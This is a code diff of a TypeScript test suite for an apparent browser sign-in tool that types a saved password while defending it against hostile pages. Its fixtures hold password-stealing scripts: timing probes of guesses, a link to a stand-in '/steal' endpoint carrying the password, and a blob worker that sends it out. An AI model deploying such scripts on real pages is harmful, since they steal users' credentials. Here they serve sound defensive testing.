@@ -20,6 +20,9 @@ type FallbackOptions = Parameters<Route["fallback"]>[0];
 /** The outcome of a sign-in that typed the stand-in and sent the form, or ran the page's submit handler that held it back. */
 const REACHED_SEND = /^(?:The login form was not sent: the page held it back|The page tried to send .+|The password could not be cleared .+)?$/u;
 
+/** A probe of a round of guesses: its round and its guess. */
+const PROBE_RE = /^\/probe\?r=(\d+)&g=(.+)$/u;
+
 /** What a test page logs once its form's submit handler runs. */
 const SUBMITTED = "reached: submit handler";
 
@@ -70,13 +73,18 @@ const site = async (host: string, handler: Handler) => {
     return { close: () => server.close(), hits, origin: `http://${host}:${(server.address() as AddressInfo).port}` };
 };
 
+/** A page in UTF-8, as it says, unless its markup names a charset of its own: one that names none is read as windows-1252. */
 const html = (response: ServerResponse, markup: string): void => {
     response.setHeader("content-type", "text/html");
-    response.end(`<!doctype html><title>Sign in</title>${markup}`);
+    response.end(`<!doctype html>${markup.includes("<meta charset") ? "" : '<meta charset="utf-8">'}<title>Sign in</title>${markup}`);
 };
 
 /** The two fields of every login page here: a username and a password. */
 const FIELDS = `<input name="user"><input name="pw" type="password">`;
+
+/** `text` as a JavaScript string literal safe inside a `<script>` of the page: no `<`, `>` or line separator stays raw. */
+const scriptString = (text: string): string =>
+    JSON.stringify(text).replaceAll(/[<>\u{2028}\u{2029}]/gu, (character) => String.raw`\u` + (character.codePointAt(0) ?? 0).toString(16).padStart(4, "0"));
 
 const loginForm = (script = "", attributes = 'method="post" action="/session"'): string =>
     `<form ${attributes}>${FIELDS}<button>Go</button></form><script>${script}</script>`;
@@ -471,8 +479,9 @@ describe(signIn, () => {
         const result = await run();
 
         expect(result).toMatchObject({ submitted: true, success: true });
-        // The answer and the cleanup's look at it, both without scripts, then the load the session goes on with.
-        expect(login.hits.filter((hit) => ["/home", "/ran"].includes(hit.url)).map((hit) => hit.url)).toStrictEqual(["/home", "/home", "/home", "/ran"]);
+        // The answer alone, without scripts: the page is never loaded again, and the session goes on from a blank tab.
+        expect(login.hits.filter((hit) => ["/home", "/ran"].includes(hit.url)).map((hit) => hit.url)).toStrictEqual(["/home"]);
+        expect(page.url()).toBe("about:blank");
     });
 
     it("signs in when the site answers the form's POST at once, with no redirect", async () => {
@@ -664,14 +673,14 @@ describe(signIn, () => {
 
     it("does not send a login form whose POST is larger than the guard reads, and aborts a large upload to the site unread", async () => {
         fixture.page = loginForm(
-            `document.forms[0].big.value = "x".repeat(${MAX_GUARDED_BODY_BYTES}); document.forms[0].pw.addEventListener("input", () => fetch("/upload", { body: "y".repeat(${MAX_GUARDED_BODY_BYTES + 1}), method: "POST" }).catch(() => console.log("upload refused")), { once: true });`,
+            `document.forms[0].big.value = "x".repeat(${MAX_GUARDED_BODY_BYTES}); document.forms[0].pw.addEventListener("input", () => fetch("/upload", { body: "y".repeat(${MAX_GUARDED_BODY_BYTES + 1}), method: "POST" }).catch(() => undefined), { once: true });`,
         ).replace("<button>", '<input type="hidden" name="big"><button>');
 
         const result = await run();
 
         expect(result).toMatchObject({ error: expect.stringContaining("more than"), submitted: false, success: false });
+        // Not the page's log of the refusal: the cleanup can leave the page before the rejected fetch reaches it.
         expect(login.hits.filter((hit) => ["/session", "/upload"].includes(hit.url))).toStrictEqual([]);
-        expect(logged).toContain("upload refused");
         expect(await passwordLeft()).toBe(false);
     });
 
@@ -847,7 +856,7 @@ describe(signIn, () => {
             (echoed: string) =>
                 `<div><template shadowrootmode="closed"><p>Signed in with ${echoed.slice(0, 3)}<b>${echoed.slice(3, 6)}</b>${echoed.slice(6)}</p></template></div>`,
         ],
-    ])("closes the session, and runs none of its script, when the reloaded page shows the password %s", async (_where, shown) => {
+    ])("hands the session on from a blank tab, running none of the answer's script, when the answer shows the password %s", async (_where, shown) => {
         let echoed = "";
 
         fixture.page = loginForm();
@@ -866,9 +875,115 @@ describe(signIn, () => {
 
         Reflect.deleteProperty(fixture, "home");
 
+        // Nothing of the answer outlives it: a password the site's own markup happens to hold costs no session.
+        expect(result).toMatchObject({ submitted: true, success: true });
+        expect(page.url()).toBe("about:blank");
+        expect(login.hits.filter((hit) => hit.url === "/home")).toHaveLength(1);
+        expect(evil.hits).toStrictEqual([]);
+    });
+
+    it("closes the session when the answer sets a cookie a script could read with the password in it", async () => {
+        fixture.page = loginForm();
+        fixture.onSession = (_request, response, body) => {
+            response.writeHead(303, { location: "/home", "set-cookie": `last=${encodeURIComponent(new URLSearchParams(body).get("pw") ?? "")}; Path=/` });
+            response.end();
+        };
+
+        const result = await run();
+
         expect(result).toMatchObject({ sessionClosed: true, submitted: true, success: false });
         expect(page.isClosed()).toBe(true);
-        expect(evil.hits).toStrictEqual([]);
+    });
+
+    it.each([
+        ["the form is sent", "", 303],
+        // Refused: no answer replaces the page, whose address and title are still its own.
+        ["the page makes its form be refused", `const field = document.forms[0].pw; field.value = [...field.value].reverse().join("");`, 303],
+        // Sent, but answered with no page: the tab keeps the page's own document.
+        ["the site answers with no page", "", 204],
+    ])(
+        "shows the page, its site and the result the same sign-in whether a guess it planted is the password or not, when %s",
+        async (_when, refusal, status) => {
+            // A guess in the page's cookies, storage, address and title before the form is sent, a probe on a timer, and the
+            // answer's own script: everything the page, its site or the result could show of the cleanup is recorded.
+            const observed = async (guess: string) => {
+                await context.close();
+                context = await browser.newContext();
+                page = await context.newPage();
+                login.hits.length = 0;
+                fixture.page = loginForm(
+                    `document.forms[0].addEventListener("submit", () => {
+                    ${refusal}
+                    document.cookie = "guess=${guess}; path=/";
+                    localStorage.setItem("guess", "${guess}");
+                    history.replaceState(null, "", "/?guess=${guess}");
+                    document.title = "${guess}";
+                    setInterval(() => fetch("/probe?tick").catch(() => undefined), 5);
+                });`,
+                );
+                fixture.home = `<h1>Home</h1><script>fetch("/ran");</script>`;
+                fixture.onSession = (_request, response) => {
+                    response.writeHead(status, status === 303 ? { location: "/home" } : {});
+                    response.end();
+                };
+
+                const result = await run();
+                const seen = login.hits.filter((hit) => hit.url !== "/probe?tick").map(({ method, url }) => `${method} ${url.replace(guess, "GUESS")}`);
+
+                return { result: JSON.stringify(result).replaceAll(guess, "GUESS"), seen };
+            };
+
+            const right = await observed(SAVED_SECRET);
+            const wrong = await observed("wrong-guess");
+
+            expect(right).toStrictEqual(wrong);
+            const sent = status === 204 ? ["GET /", "POST /session"] : ["GET /", "POST /session", "GET /home"];
+
+            expect(wrong.seen).toStrictEqual(refusal ? ["GET /"] : sent);
+            expect(wrong.result).not.toContain("withheld");
+        },
+    );
+
+    it("types nothing into a form in a charset other than UTF-8, whatever the password", async () => {
+        fixture.page = `<meta charset="windows-1252">${loginForm()}`;
+
+        const result = await run();
+
+        expect(result).toMatchObject({ error: expect.stringContaining("encodes what it sends"), submitted: false, success: false });
+        expect(sessionPosts()).toStrictEqual([]);
+    });
+
+    it("keeps a cross-site frame paused, and closes the session, when its lock is not confirmed", async () => {
+        const { newCDPSession } = context;
+
+        // Each lock script sent into a child session fails there.
+        context.newCDPSession = async (...args) => {
+            const session = await newCDPSession.apply(context, args);
+            const { send } = session;
+
+            session.send = (async (method: string, params?: Parameters<typeof send>[1]) => {
+                const message = (params as { message?: string } | undefined)?.message;
+
+                return method === "Target.sendMessageToTarget" && message?.includes("Page.addScriptToEvaluateOnNewDocument")
+                    ? send.call(
+                          session,
+                          method as never,
+                          { ...params, message: message.replace("Page.addScriptToEvaluateOnNewDocument", "Page.noSuchCommand") } as never,
+                      )
+                    : send.call(session, method as never, params as never);
+            }) as typeof send;
+
+            return session;
+        };
+        fixture.evil = `<script>fetch("/ran");</script>`;
+        fixture.page = `<iframe src="${evil.origin}/relay"></iframe>${loginForm()}`;
+
+        const result = await run();
+
+        // Typed or not, depending on when the frame attached: either way the frame never ran, and the session is closed.
+        expect(result).toMatchObject({ error: expect.stringContaining("could not be locked"), sessionClosed: true, success: false });
+        expect(page.isClosed()).toBe(true);
+        expect(evil.hits.map((hit) => hit.url)).toStrictEqual(["/relay"]);
     });
 
     it.each([
@@ -938,10 +1053,10 @@ describe(signIn, () => {
 
     it.each([
         ["in characters", "x".repeat(2 * 1024 * 1024)],
-        // Sent as UTF-8 and read as windows-1252: 1.5 MB as sent, and each "é" two characters of two bytes as read.
-        ["in bytes", "é".repeat(768 * 1024)],
+        // Two bytes each in UTF-8: just over 2 MB, in half as many characters.
+        ["in bytes", "é".repeat(1024 * 1024 + 1024)],
     ])("types nothing when the page's HTML as the site sent it is past the 2 MB it is read up to %s", async (_how, filler) => {
-        fixture.page = `<meta charset="windows-1252">${loginForm()}<!--${filler}-->`;
+        fixture.page = `<meta charset="utf-8">${loginForm()}<!--${filler}-->`;
 
         const result = await run();
 
@@ -964,7 +1079,7 @@ describe(signIn, () => {
     });
 
     it("types nothing into a login form a script builds", async () => {
-        fixture.page = `<div id="app"></div><script>document.querySelector("#app").innerHTML = ${JSON.stringify(loginForm()).replaceAll("</", String.raw`<\/`)};</script>`;
+        fixture.page = `<div id="app"></div><script>document.querySelector("#app").innerHTML = ${scriptString(loginForm())};</script>`;
 
         const result = await run();
 
@@ -1038,7 +1153,7 @@ describe(signIn, () => {
     const closedRules = (origin: string): string =>
         `'<div><template shadowrootmode="closed"><script type="speculationrules">${EVERY_LINK}</' + 'script></template></div><a href="${origin}/steal?' + encodeURIComponent(pw) + '">x</a>'`;
     const blobWorker = (realm: string): string =>
-        `new ${realm}.Worker(${realm}.URL.createObjectURL(new ${realm}.Blob([${JSON.stringify(`${exfiltrate()} onmessage = (event) => send(event.data);`)}]))).postMessage(pw);`;
+        `new ${realm}.Worker(${realm}.URL.createObjectURL(new ${realm}.Blob([${scriptString(`${exfiltrate()} onmessage = (event) => send(event.data);`)}]))).postMessage(pw);`;
 
     it("sees the form's POST past a service worker that would answer it itself", async () => {
         fixture.page = loginForm();
@@ -1299,9 +1414,11 @@ describe(signIn, () => {
             `document.forms[0].addEventListener("submit", () => {
                 const field = document.forms[0].pw;
                 field.value = [...field.value].reverse().join("");
+                let round = 0;
                 setInterval(() => {
+                    round += 1;
                     for (const guess of ["${SAVED_SECRET}", "wrong-guess"]) {
-                        fetch("/probe?g=" + guess).catch(() => undefined);
+                        fetch("/probe?r=" + round + "&g=" + guess).catch(() => undefined);
                     }
                 }, 2);
             });`,
@@ -1311,10 +1428,22 @@ describe(signIn, () => {
 
         expect(result).toMatchObject({ error: expect.stringContaining("changed the password field"), submitted: false, success: false });
 
-        const reached = (guess: string): number => login.hits.filter((hit) => hit.url === `/probe?g=${guess}`).length;
+        // The rounds each guess reached the site in. The cleanup can cut the last round between its two requests: that round
+        // is left out, whichever guess it reached with.
+        const rounds = (guess: string): number[] =>
+            login.hits.flatMap((hit) => {
+                const found = PROBE_RE.exec(hit.url);
 
-        expect(reached("wrong-guess")).toBeGreaterThan(0);
-        expect(reached(SAVED_SECRET)).toBe(reached("wrong-guess"));
+                return found?.[2] === guess ? [Number(found[1])] : [];
+            });
+        const last = Math.max(...rounds("wrong-guess"), ...rounds(SAVED_SECRET));
+        const before = (guess: string): number[] =>
+            rounds(guess)
+                .filter((round) => round < last)
+                .toSorted((a, b) => a - b);
+
+        expect(before("wrong-guess").length).toBeGreaterThan(0);
+        expect(before(SAVED_SECRET)).toStrictEqual(before("wrong-guess"));
     });
 
     /** The bodies `route.fallback` hands on with the password; `handled` is told of every route handed on or aborted. */
@@ -1745,6 +1874,9 @@ describe(signIn, () => {
         await expect(page.waitForEvent("framenavigated", { timeout: 1000 })).rejects.toThrow();
 
         expect(await page.content()).not.toContain(SAVED_SECRET);
+
+        // The session goes on from a blank tab: a page of the site asks the cache.
+        await page.goto(`${login.origin}/home`);
 
         const cached = await page.evaluate(async () =>
             fetch("/session", { cache: "only-if-cached", mode: "same-origin" })
